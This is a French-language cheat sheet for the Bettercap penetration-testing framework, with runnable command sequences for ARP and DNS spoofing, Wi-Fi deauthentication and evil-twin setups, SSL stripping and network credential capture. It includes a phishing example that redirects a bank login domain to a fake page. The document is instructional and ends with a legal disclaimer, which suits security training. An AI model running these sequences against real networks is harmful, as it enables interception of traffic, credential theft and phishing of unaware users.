# 🦈 Bettercap — aide-mémoire du framework d’attaque réseau

<!-- language-home-navigation -->
[🏠 Accueil en français](../../README.fr.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
  ██████╗ ███████╗████████╗████████╗███████╗██████╗  ██████╗ █████╗ ██████╗ 
  ██╔══██╗██╔════╝╚══██╔══╝╚══██╔══╝██╔════╝██╔══██╗██╔════╝██╔══██╗██╔══██╗
  ██████╔╝█████╗     ██║      ██║   █████╗  ██████╔╝██║     ███████║██████╔╝
  ██╔══██╗██╔══╝     ██║      ██║   ██╔══╝  ██╔══██╗██║     ██╔══██║██╔═══╝ 
  ██████╔╝███████╗   ██║      ██║   ███████╗██║  ██║╚██████╗██║  ██║██║     
  ╚═════╝ ╚══════╝   ╚═╝      ╚═╝   ╚══════╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝     
            Couteau suisse des attaques réseau
```

<p align="center">
  <img src="https://img.shields.io/badge/Bettercap-MITM-blue?style=for-the-badge" alt="Bettercap">
  <img src="https://img.shields.io/badge/WiFi-Attacks-red?style=for-the-badge" alt="WiFi">
  <img src="https://img.shields.io/badge/Network-Recon-green?style=for-the-badge" alt="Réseau">
</p>

---

## 📋 Table des matières

- [Qu’est-ce que Bettercap ?](#-quest-ce-que-bettercap-)
- [Installation](#-installation)
- [Utilisation de base](#-utilisation-de-base)
- [Reconnaissance réseau](#-reconnaissance-réseau)
- [Usurpation ARP (MITM)](#-usurpation-arp-mitm)
- [Usurpation DNS](#-usurpation-dns)
- [Attaques Wi-Fi](#-attaques-wi-fi)
- [Rétrogradation HTTPS](#-rétrogradation-https)
- [Capture d’identifiants sur le réseau](#-capture-didentifiants-sur-le-réseau)
- [Caplets](#-caplets)
- [Interface web](#-interface-web)
- [Référence rapide](#-référence-rapide)
- [Avertissement juridique](#-avertissement-juridique)
- [Ressources](#-ressources)

---

## 🎯 Qu’est-ce que Bettercap ?

**Bettercap** est un outil polyvalent pour la reconnaissance Wi-Fi, Bluetooth et réseau. L’original le présente comme le successeur d’ettercap ; il s’agit de projets distincts, aux fonctions en partie comparables. Bettercap propose notamment :

- 🔍 **Reconnaissance réseau** — Découvrir les hôtes et services
- 🎭 **Attaques de l’intercepteur (MITM)** — Usurpation ARP et DNS
- 📶 **Attaques Wi-Fi** — Désauthentification, faux point d’accès (evil twin), capture d’échanges d’authentification (handshakes)
- 🔓 **Capture d’identifiants** — HTTP, HTTPS après rétrogradation (downgrade, selon les conditions)
- 📡 **Bluetooth/BLE** — Découverte d’appareils et attaques
- 🌐 **Interface web** — Interface graphique dans un navigateur

### Fonctionnalités

| Fonctionnalité | Description |
|---------|-------------|
| **Modulaire** | Extensible avec des caplets |
| **Interactif** | Console de commandes en temps réel |
| **Automatisable** | Automatisation au moyen de fichiers caplet |
| **Interface web** | Interface dans un navigateur |
| **Langage Go** | Rapide, moderne et multiplateforme |

---

## 🚀 Installation

> **Version des exemples :** la présence du paquet dépend de la distribution et de son installation. L’exemple Go original est conservé, mais la documentation actuelle utilise un chemin de module versionné `/v2` et liste aussi des dépendances natives ([installation officielle](https://www.bettercap.org/project/installation/)).

### Kali Linux (préinstallé selon la distribution)

```bash
# Déjà installé dans Kali
bettercap --help

# Mettre à jour
sudo apt update && sudo apt install bettercap
```

### Debian/Ubuntu

```bash
sudo apt update
sudo apt install bettercap
```

### Depuis les sources

```bash
# Installer Go au préalable
sudo apt install golang

# Installer Bettercap
go install github.com/bettercap/bettercap@latest

# Ou
git clone https://github.com/bettercap/bettercap
cd bettercap
make build
sudo make install
```

### Installer l’interface web (facultatif)

```bash
# Télécharger l’interface web
sudo bettercap -eval "caplets.update; ui.update; quit"
```

---

## 💻 Utilisation de base

### Démarrer Bettercap

```bash
# Démarrage simple (nécessite root)
sudo bettercap

# Préciser l’interface
sudo bettercap -iface eth0
sudo bettercap -iface wlan0

# Mode non interactif (exécuter des commandes)
sudo bettercap -eval "net.probe on; net.show"

# Charger un fichier caplet
sudo bettercap -caplet http-ui
```

### Console interactive

```bash
# Dans la console Bettercap
» help                      # Afficher toutes les commandes
» help net.probe            # Aide sur un module précis
» net.show                  # Afficher les hôtes découverts
» set arp.spoof.targets X   # Définir une variable
» arp.spoof on              # Activer le module
» quit                      # Quitter
```

### Gestion des modules

```bash
# Lister tous les modules
» help

# Afficher les informations du module
» help arp.spoof

# Activer le module
» arp.spoof on

# Désactiver le module
» arp.spoof off

# Afficher les paramètres du module
» get arp.spoof.*
```

---

## 🔍 Reconnaissance réseau

> **Précision :** `net.probe` envoie des sondes, tandis que `net.recon` consulte la table ARP. Les paramètres `net.probe.passive` et `net.probe.timeout` ne figurent pas dans la référence actuelle ; `net.show.meta` affiche des métadonnées, pas seulement les hôtes actifs. La sortie PCAP du dernier bloc enregistre des paquets et n’exporte pas la liste des hôtes ([sondes](https://www.bettercap.org/modules/ethernet/netprobe/), [reconnaissance](https://www.bettercap.org/modules/ethernet/netrecon/)).

### Découverte des hôtes

```bash
# Activer les sondes réseau
» net.probe on

# Afficher les hôtes découverts
» net.show

# Sortie :
┌─────────────────────────────────────────────────────────────┐
│ IP               MAC                Vendor            Seen  │
├─────────────────────────────────────────────────────────────┤
│ 192.168.1.1      AA:BB:CC:DD:EE:FF  TP-Link           5s    │
│ 192.168.1.100    11:22:33:44:55:66  Apple             2s    │
└─────────────────────────────────────────────────────────────┘
```

### Informations réseau

```bash
# Afficher l’interface courante
» net.show

# Informations sur l’interface
» get net.interface.*

# Informations sur la passerelle
» get gateway.*
```

### Options des sondes

```bash
# Définir le délai entre les sondes
» set net.probe.throttle 10

# Mode passif (écoute seule)
» set net.probe.passive true

# Définir le délai d’expiration des sondes
» set net.probe.timeout 500
```

### Commandes de reconnaissance

```bash
# Reconnaissance complète
» net.recon on

# Effacer les hôtes
» net.clear

# Afficher uniquement les hôtes actifs
» set net.show.meta true
» net.show

# Exporter dans un fichier
» set net.sniff.output /tmp/capture.pcap
» net.sniff on
```

---

## 🎭 Usurpation ARP (MITM)

> **Précision :** activer le module ne garantit pas une interception réussie ; topologie, protections et transfert des paquets comptent. `arp.spoof.internal` étend l’usurpation aux échanges internes, contrairement au commentaire simplifié de l’original ; il ne signifie pas à lui seul « sans passerelle » ([documentation officielle](https://www.bettercap.org/modules/ethernet/spoofers/arpspoof/)).

### Usurpation ARP de base

```bash
# Démarrer Bettercap
sudo bettercap -iface eth0

# Activer les sondes
» net.probe on

# Patienter, puis afficher les hôtes
» net.show

# Définir la cible (victime)
» set arp.spoof.targets 192.168.1.100

# Activer l’usurpation ARP
» arp.spoof on

# Vous êtes maintenant en position MITM !
```

### Bidirectionnel (full duplex)

```bash
# Usurper les adresses de la victime et de la passerelle
» set arp.spoof.fullduplex true
» set arp.spoof.targets 192.168.1.100
» arp.spoof on
```

### Usurper les adresses de tout un sous-réseau

```bash
# Cibler tous les hôtes sauf la passerelle
» set arp.spoof.targets 192.168.1.0/24
» arp.spoof on

# Trafic interne uniquement (sans usurper la passerelle)
» set arp.spoof.internal true
» arp.spoof on
```

### Usurpation ARP et capture

```bash
# Configuration MITM complète
» net.probe on
» set arp.spoof.targets 192.168.1.100
» set arp.spoof.fullduplex true
» arp.spoof on
» net.sniff on
```

---

## 🌐 Usurpation DNS

> **Précision :** le module doit recevoir les requêtes DNS concernées ; une position réseau adaptée est nécessaire et ARP n’est pas l’unique mécanisme possible. Les exemples ne garantissent pas la redirection d’un client utilisant un autre canal de résolution ([documentation DNS](https://www.bettercap.org/modules/ethernet/spoofers/dnsspoof/)).

### Usurpation DNS de base

```bash
# Définir les domaines DNS à usurper
» set dns.spoof.domains example.com, *.example.com

# Définir l’adresse de redirection (votre machine)
» set dns.spoof.address 192.168.1.50

# Activer (nécessite l’usurpation ARP)
» arp.spoof on
» dns.spoof on
```

### Usurper tous les domaines

```bash
# Joker : tout rediriger
» set dns.spoof.domains *
» set dns.spoof.address 192.168.1.50
» dns.spoof on
```

### Plusieurs domaines

```bash
# Liste des domaines
» set dns.spoof.domains facebook.com, *.facebook.com, twitter.com, *.twitter.com
» set dns.spoof.address 192.168.1.50
» dns.spoof on
```

### Usurpation DNS avec serveur HTTP

```bash
# Configuration complète d’hameçonnage
» set dns.spoof.domains login.example.com
» set dns.spoof.address 192.168.1.50
» dns.spoof on

# Démarrer le serveur HTTP sur votre machine
» set http.server.path /var/www/phishing
» http.server on
```

---

## 📶 Attaques Wi-Fi

> **Précision :** la reconnaissance et les émissions nécessitent une interface et des pilotes compatibles avec le mode moniteur et l’injection. Les noms `wifi.deauth.station`, `wifi.deauth.repeat` et `wifi.show.wpa` ne figurent pas dans la référence actuelle ; leur présence ne doit pas être supposée. Les protections du réseau et des clients peuvent également empêcher l’effet attendu. Les lignes historiques sont conservées ([module Wi-Fi](https://www.bettercap.org/modules/wifi/)).

### Activer le mode Wi-Fi

```bash
# Démarrer avec l’interface Wi-Fi
sudo bettercap -iface wlan0

# Activer la reconnaissance Wi-Fi
» wifi.recon on

# Afficher les points d’accès découverts
» wifi.show
```

### Reconnaissance Wi-Fi

```bash
# Afficher tous les points d’accès
» wifi.show

# Sortie :
┌───────────────────────────────────────────────────────────────────┐
│ RSSI  BSSID              Ch  Enc     ESSID               Clients │
├───────────────────────────────────────────────────────────────────┤
│ -45   AA:BB:CC:DD:EE:FF   6  WPA2    HomeNetwork              3  │
│ -60   11:22:33:44:55:66   1  WPA2    Office_WiFi              1  │
└───────────────────────────────────────────────────────────────────┘
```

### Attaque par désauthentification

```bash
# Désauthentifier tous les clients d’un point d’accès précis
» wifi.deauth AA:BB:CC:DD:EE:FF

# Désauthentifier un client précis
» set wifi.deauth.station 11:22:33:44:55:66
» wifi.deauth AA:BB:CC:DD:EE:FF

# Désauthentification continue
» set wifi.deauth.repeat 100
» wifi.deauth AA:BB:CC:DD:EE:FF
```

### Capture des échanges d’authentification (handshakes)

> **Précision :** `wifi.handshakes.file` désigne par défaut un fichier PCAP, pas simplement un dossier ; le mode d’agrégation change l’organisation des sorties. Une capture PMKID dépend aussi de la compatibilité du point d’accès et ne révèle pas automatiquement son mot de passe ([paramètres Wi-Fi](https://www.bettercap.org/modules/wifi/)).

```bash
# Activer la reconnaissance Wi-Fi
» wifi.recon on

# Définir le canal, identique à celui de la cible
» wifi.recon.channel 6

# Capturer les échanges d’authentification
» set wifi.handshakes.file /tmp/handshakes/

# Désauthentifier pour provoquer une reconnexion
» wifi.deauth AA:BB:CC:DD:EE:FF

# Examiner les échanges capturés
» wifi.show.wpa
```

### Attaque du faux point d’accès (evil twin)

> **Précision :** `wifi.ap` injecte des balises de gestion ; ces lignes ne construisent pas à elles seules un point d’accès complet offrant association et connectivité. Une désauthentification ne garantit pas qu’un client rejoindra un réseau cloné ([documentation Wi-Fi](https://www.bettercap.org/modules/wifi/)).

```bash
# Cloner le point d’accès
» set wifi.ap.ssid "Free WiFi"
» set wifi.ap.bssid AA:BB:CC:DD:EE:FF
» set wifi.ap.channel 6
» set wifi.ap.encryption false

# Démarrer le faux point d’accès
» wifi.ap on

# Désauthentifier ensuite le vrai point d’accès pour inciter les clients à se reconnecter
» wifi.deauth <real_AP_BSSID>
```

### Attaque PMKID

```bash
# Attaque moderne sans client
» wifi.recon on
» wifi.assoc AA:BB:CC:DD:EE:FF

# PMKID capturé dans le dossier des échanges
» wifi.show.wpa
```

---

## 🔒 Rétrogradation HTTPS

> **Précision :** le titre « HSTS Bypass » est historique : SSL stripping ne contourne pas universellement HSTS. Un navigateur applique sa politique HSTS avant la requête et refuse les erreurs TLS ; le proxy HTTPS ne rend pas automatiquement son autorité de certification digne de confiance pour le client. Capturer des paquets chiffrés ne suffit donc pas à lire les identifiants ([RFC 6797](https://www.rfc-editor.org/rfc/rfc6797.html#section-8), [proxy HTTPS](https://www.bettercap.org/modules/ethernet/proxies/httpsproxy/)).

### SSL Strip (contournement HSTS selon l’original)

```bash
# Activer d’abord l’usurpation ARP
» arp.spoof on

# Activer SSL strip
» set https.proxy.sslstrip true
» https.proxy on

# Ou utiliser le proxy HTTP
» http.proxy on
```

### Proxy HTTPS

```bash
# Configurer le proxy HTTPS
» set https.proxy.address 0.0.0.0
» set https.proxy.port 8080
» https.proxy on

# Avec un certificat
» set https.proxy.certificate /path/to/cert.pem
» set https.proxy.key /path/to/key.pem
» https.proxy on
```

### Capturer le trafic HTTPS

```bash
# Interception MITM complète avec HTTPS
» net.probe on
» set arp.spoof.targets 192.168.1.100
» arp.spoof on
» set https.proxy.sslstrip true
» https.proxy on
» net.sniff on
```

---

## 🔓 Capture d’identifiants sur le réseau

### Identifiants HTTP

```bash
# Activer la capture réseau
» net.sniff on

# Activer la capture locale
» set net.sniff.local true
» net.sniff on

# Filtrer HTTP
» set net.sniff.filter "tcp port 80"
» net.sniff on
```

### Collecte d’identifiants

```bash
# Capture complète d’identifiants
» net.probe on
» set arp.spoof.targets 192.168.1.100
» arp.spoof on
» set https.proxy.sslstrip true
» https.proxy on
» net.sniff on

# Les identifiants s’affichent en temps réel
```

### Enregistrer dans un fichier

```bash
# Enregistrer les paquets capturés
» set net.sniff.output /tmp/capture.pcap
» net.sniff on

# Sortie détaillée
» set net.sniff.verbose true
» net.sniff on
```

---

## 📜 Caplets

### Que sont les caplets ?

Les *caplets* sont des fichiers de script (.cap) qui automatisent les commandes Bettercap.

### Caplets fournis

```bash
# Lister les caplets
» caplets.show

# Caplets courants :
- http-ui       # Interface web
- https-ui      # Interface web sécurisée
- local-sniffer # Capturer le trafic local
- mitm          # Configuration MITM de base
- pita          # Automatisation d’attaques Wi-Fi
```

### Charger un caplet

```bash
# Depuis la ligne de commande
sudo bettercap -caplet http-ui

# Dans Bettercap
» caplet http-ui

# Depuis un fichier
sudo bettercap -caplet /path/to/custom.cap
```

### Créer un caplet personnalisé

```bash
# Fichier : my-mitm.cap
net.probe on
sleep 5
set arp.spoof.targets 192.168.1.100
set arp.spoof.fullduplex true
arp.spoof on
net.sniff on
set net.sniff.verbose true
```

```bash
# Exécuter le caplet personnalisé
sudo bettercap -caplet my-mitm.cap
```

### Mettre à jour les caplets

```bash
# Mettre à jour tous les caplets
» caplets.update
```

---

## 🌐 Interface web

> **Version des exemples :** les caplets et l’interface ont évolué. L’interface HTTP et l’API REST utilisent des services et paramètres distincts ; les identifiants `user/pass`, l’URL HTTPS et les réglages `http.server.*` du texte original ne constituent pas une configuration universelle de l’API. Vérifier le caplet installé et les paramètres de sa version ([interface actuelle](https://www.bettercap.org/usage/web_ui/), [caplet officiel](https://github.com/bettercap/caplets/blob/master/http-ui.cap), [API](https://www.bettercap.org/modules/core/apirest/)).

### Démarrer l’interface web

```bash
# Installer d’abord l’interface web
sudo bettercap -eval "caplets.update; ui.update; quit"

# Démarrer avec l’interface web HTTP
sudo bettercap -caplet http-ui

# Démarrer avec l’interface web HTTPS
sudo bettercap -caplet https-ui

# Accès : https://127.0.0.1:8080/
# Identifiants par défaut : user/pass
```

### Fonctions de l’interface web

| Fonctionnalité | Description |
|---------|-------------|
| **Dashboard** (tableau de bord) | Vue du réseau en temps réel |
| **Hosts** (hôtes) | Appareils découverts |
| **WiFi** | Réseaux sans fil |
| **BLE** | Appareils Bluetooth |
| **Events** (événements) | Journal d’activité |
| **Packets** (paquets) | Trafic capturé |

### Configurer l’interface web

```bash
# Définir les identifiants
» set http.server.username admin
» set http.server.password secretpass

# Définir le port
» set http.server.port 8080

# Adresse d’écoute
» set http.server.address 0.0.0.0
```

---

## 📊 Référence rapide

### Commandes essentielles

| Commande | Description |
|---------|-------------|
| `net.probe on` | Démarrer la découverte des hôtes |
| `net.show` | Afficher les hôtes découverts |
| `arp.spoof on` | Activer l’usurpation ARP |
| `net.sniff on` | Démarrer la capture de paquets |
| `dns.spoof on` | Activer l’usurpation DNS |
| `wifi.recon on` | Démarrer la reconnaissance Wi-Fi |
| `wifi.deauth BSSID` | Attaque par désauthentification |
| `https.proxy on` | Activer le proxy HTTPS |

### Variables courantes

| Variable | Description |
|----------|-------------|
| `arp.spoof.targets` | Cibles de l’interception MITM |
| `arp.spoof.fullduplex` | Usurpation dans les deux sens |
| `dns.spoof.domains` | Domaines à usurper |
| `dns.spoof.address` | Adresse IP de redirection |
| `net.sniff.output` | Fichier de sortie PCAP |
| `wifi.ap.ssid` | Nom du faux point d’accès |

### Modèle d’attaque MITM

```bash
# Interception MITM de base
sudo bettercap -iface eth0 -eval "
net.probe on;
sleep 3;
set arp.spoof.targets 192.168.1.100;
set arp.spoof.fullduplex true;
arp.spoof on;
net.sniff on"
```

### Modèle d’attaque Wi-Fi

```bash
# Désauthentification Wi-Fi et capture
sudo bettercap -iface wlan0 -eval "
wifi.recon on;
sleep 5;
wifi.deauth AA:BB:CC:DD:EE:FF"
```

### Exemple complet d’hameçonnage

```bash
# Usurpation DNS et faux site
» net.probe on
» set arp.spoof.targets 192.168.1.100
» arp.spoof on
» set dns.spoof.domains login.bank.com
» set dns.spoof.address 192.168.1.50
» dns.spoof on
» set http.server.path /var/www/fake-login
» http.server on
```

---

<a id="-avertissement-juridique"></a>
## ⚠️ Avertissement juridique

```
⚠️ ATTENTION : Bettercap est un outil puissant capable d’intercepter
le trafic réseau. À utiliser uniquement sur les réseaux dont vous êtes
PROPRIÉTAIRE ou pour lesquels vous disposez d’une AUTORISATION ÉCRITE EXPLICITE de test.

✅ Tests d’intrusion autorisés
✅ Recherche en sécurité dans un laboratoire
✅ Objectifs pédagogiques

❌ L’interception sans autorisation est ILLÉGALE
❌ Ne jamais utiliser sur des réseaux publics
❌ Ne jamais voler d’identifiants
```

---

## 📚 Ressources

- [Site officiel de Bettercap](https://www.bettercap.org/)
- [Bettercap sur GitHub](https://github.com/bettercap/bettercap)
- [Documentation de Bettercap](https://www.bettercap.org/modules/)
- [Caplets](https://github.com/bettercap/caplets)

### Aide-mémoire associés
- [Aircrack-ng](../../Aircrack-ng/translations/README.fr.md)
- [Wifite](../../Wifite/translations/README.fr.md)
- [Wireshark](../../Wireshark/translations/README.fr.md)

---

<p align="center">
  <b>🦈 Maîtrisez les attaques réseau !</b><br>
  <i>Bettercap — un outil polyvalent pour les tests d’intrusion réseau</i>
</p>
